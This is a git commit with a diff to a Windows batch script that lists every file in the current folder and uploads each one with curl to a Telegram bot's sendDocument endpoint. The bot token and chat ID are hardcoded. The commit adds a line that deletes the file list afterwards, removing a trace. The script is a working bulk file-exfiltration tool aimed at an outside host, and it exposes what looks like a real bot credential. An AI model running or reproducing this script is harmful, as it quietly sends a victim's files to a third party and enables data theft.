b8b2492301aae102e201beada0db3db64a692dc2
pingme998 <77038591+pingme998@users.noreply.github.com>
2021-12-13 14:23:43 +0530

    Update 0up0to0teasing0bot0to0me.cmd

--- 0up0to0teasing0bot0to0me.cmd
+++ 0up0to0teasing0bot0to0me.cmd
@@ -1,2 +1,3 @@
 dir /b >list.txt
 powershell -Command "(gc list.txt) -replace '^', 'curl -F document=@"' -replace '$', '" https://api.telegram.org/bot2075322260:AAHwa3tRJuugVL03whnhUwoWFtOGBwpZ-gQ/sendDocument?chat_id=688448558' |cmd
+del list.txt
